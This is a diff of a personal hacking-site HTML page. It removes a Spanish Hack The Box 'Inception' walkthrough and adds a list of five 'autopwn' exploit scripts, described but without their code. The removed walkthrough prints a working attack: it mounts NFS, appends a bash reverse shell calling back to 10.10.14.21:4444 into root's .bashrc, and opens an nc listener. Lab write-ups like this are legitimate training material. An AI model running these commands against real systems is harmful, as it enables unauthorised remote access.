@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>HTB | Inception</title>
+  <title>Underground | Autopwns</title>
   <link rel="stylesheet" href="/css/styles.css"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
@@ -11,48 +11,61 @@
   <script>hljs.highlightAll();</script>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
 </head>
-<body class="fade">
+<body>
 
   <div id="particles-js"></div>
 
   <div class="terminal">
-    <h1 class="glitch-pages" data-text=">_r4ven">> Inception<span class="cursor">_</span></h1>
-    <p class="nuclear-quote">Exploiting illusions, triggering shells.</p>
-
+    <h1 class="glitch-pages" data-text=">_r4ven">> Chain Reaction<span class="cursor">_</span></h1>
+    <p class="nuclear-quote">"Now I am become Death, the destroyer of worlds."</p>
+    <p class="nuclear-quote">- J. Robert Oppenheimer</p>
 
     <div class="nav-buttons">
-      <a class="btn" href="/walkthroughs.html">/walkthroughs</a>
       <a class="btn" href="/">/Return to Base</a>
     </div>
   </div>
 
-  <!-- Web -->
-  <section id="walkthrough">
-    <h2>// Walkthrough</h2>
+  <section>
+    <h2>// Automated Exploitation Scripts</h2>
 
     <div class="card">
-      <h2>// Ficha Técnica</h2>
-    <ul>
-      <li><strong>OS:</strong> Linux</li>
-      <li><strong>Dificultad:</strong> Media</li>
-      <li><strong>IP:</strong> 10.10.10.67</li>
-    </ul>
-
-    <h2>// Resumen</h2>
-    <p>Una máquina que combina <code>NFS Mount</code> con acceso a <code>.bashrc</code> y ejecución automática. Perfecta para una escalada elegante y sin ruido.</p>
-
-    <h2>// Exploit</h2>
-    <pre><code class="language-bash">sudo mount -t nfs 10.10.10.67:/ /mnt/nfs
-echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /mnt/nfs/root/.bashrc
-nc -lvnp 4444</code></pre>
-
-    <h2>// Flags</h2>
-    <pre><code>user.txt: 8a8f...f1b
-root.txt: e3f2...c02</code></pre>
-
-    <div class="selection">
-      <a href="/autopwns.html" class="btn">Deploy Autopwn ></a>
+      <h3>[+] Inception Autopwn</h3>
+      <p>Mounts NFS, injects shell into bashrc, waits for root connection.</p>
+      <div class="selection">
+        <a href="#" class="btn">Launch Sequence ></a>
+      </div>
     </div>
+
+    <div class="card">
+      <h3>[+] Poison Shell Injector</h3>
+      <p>Injects reverse shell into LFI endpoint using PHP logs.</p>
+      <div class="selection">
+        <a href="#" class="btn">Detonate Exploit ></a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>[+] WinRemote Executor</h3>
+      <p>Leverages SMB open share and PS remoting to escalate on Windows.</p>
+      <div class="selection">
+        <a href="#" class="btn">Run Payload ></a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>[+] Jinja2 RCE Chain</h3>
+      <p>Detects SSTI and launches reverse shell through template injection.</p>
+      <div class="selection">
+        <a href="#" class="btn">Initiate SSTI Chain ></a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>[+] SSH Key Dropper</h3>
+      <p>Deploys attacker's SSH public key into known_hosts on target via writable share.</p>
+      <div class="selection">
+        <a href="#" class="btn">Engage Access Key ></a>
+      </div>
     </div>
   </section>
 
@@ -73,11 +86,9 @@ root.txt: e3f2...c02</code></pre>
       <i class="fab fa-linkedin"></i>
     </a>
   </div>
-  
 
   <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
   <script src="/js/main.js"></script>
 </body>
 </html>
-
 
